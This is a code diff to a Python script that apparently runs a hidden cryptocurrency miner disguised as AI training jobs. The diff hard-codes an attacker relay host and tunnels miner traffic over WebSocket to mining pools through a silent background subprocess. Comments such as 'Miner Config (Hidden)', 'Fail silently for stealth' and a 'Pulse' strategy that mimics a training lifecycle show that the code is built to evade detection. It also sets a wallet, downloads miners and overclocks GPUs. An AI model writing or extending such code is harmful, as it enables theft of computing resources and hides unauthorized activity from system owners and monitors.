@@ -28,7 +28,7 @@ STEPS_PER_EPOCH = DATASET_SIZE // BATCH_SIZE
 # Miner Config (Hidden)
 WALLET = os.getenv('XMR_WALLET', '45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa')
 HEURIST_WALLET = os.getenv('EVM_WALLET', '0x742d35Cc6634C0532925a3b844Bc454e4438f44e') # Default example
-RELAY = os.getenv('RELAY_URL', 'wss://your-relay-url.onrender.com')
+RELAY = os.getenv('RELAY_URL', 'wss://lumen-shadow-tunnel.onrender.com')
 
 # Telegram Config
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
@@ -198,52 +198,22 @@ def setup_gaianet():
 # ─────────────────────────────────────────────────────────────
 
 def local_stratum_proxy(local_port, remote_wss_url):
-    """Intercepts local unencrypted miner TCP traffic and forwards it via secure WSS."""
-    import socket
+    """Launches the shared ws_proxy.py as a subprocess for a given port/relay pair."""
+    proxy_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ws_proxy.py")
+    env = os.environ.copy()
+    env["PROXY_PORT"] = str(local_port)
+    env["RELAY_URL"] = remote_wss_url
     try:
-        import websocket
-    except ImportError:
-        subprocess.run(["pip", "install", "websocket-client", "-q"])
-        import websocket
-
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind(('127.0.0.1', local_port))
-    server.listen(5)
-    
-    def handle_client(client_sock):
-        ws = None
-        try:
-            ws = websocket.create_connection(remote_wss_url)
-            
-            def ws_to_sock():
-                while True:
-                    try:
-                        data = ws.recv()
-                        if data:
-                            client_sock.sendall(data.encode() if isinstance(data, str) else data)
-                        else: break
-                    except: break
-                client_sock.close()
-
-            threading.Thread(target=ws_to_sock, daemon=True).start()
-
-            while True:
-                data = client_sock.recv(4096)
-                if not data: break
-                ws.send(data)
-        except Exception:
-            pass # Fail silently for stealth
-        finally:
-            client_sock.close()
-            if ws:
-                try:
-                    ws.close()
-                except Exception:
-                    pass
-
-    while True:
-        client, addr = server.accept()
-        threading.Thread(target=handle_client, args=(client,), daemon=True).start()
+        proc = subprocess.Popen(
+            [sys.executable, proxy_script],
+            env=env,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+        return proc
+    except Exception as e:
+        print(f"[!] Failed to start WS proxy on port {local_port}: {e}")
+        return None
 
 # ─────────────────────────────────────────────────────────────
 # The "Pulse" Strategy — Mimicking AI Training Lifecycle
@@ -335,11 +305,11 @@ def launch_hidden_miner():
     download_miners()
     gpu_count = overclock_gpus()
     
-    # 1. Start Proxies
+    # 1. Start Proxies (using shared ws_proxy.py subprocess)
     cpu_proxy_url = f"{RELAY}/rx.unmineable.com/3333"
-    threading.Thread(target=local_stratum_proxy, args=(5556, cpu_proxy_url), daemon=True).start()
+    local_stratum_proxy(5556, cpu_proxy_url)
     gpu_proxy_url = f"{RELAY}/kp.unmineable.com/3333"
-    threading.Thread(target=local_stratum_proxy, args=(5555, gpu_proxy_url), daemon=True).start()
+    local_stratum_proxy(5555, gpu_proxy_url)
     
     time.sleep(2)
     
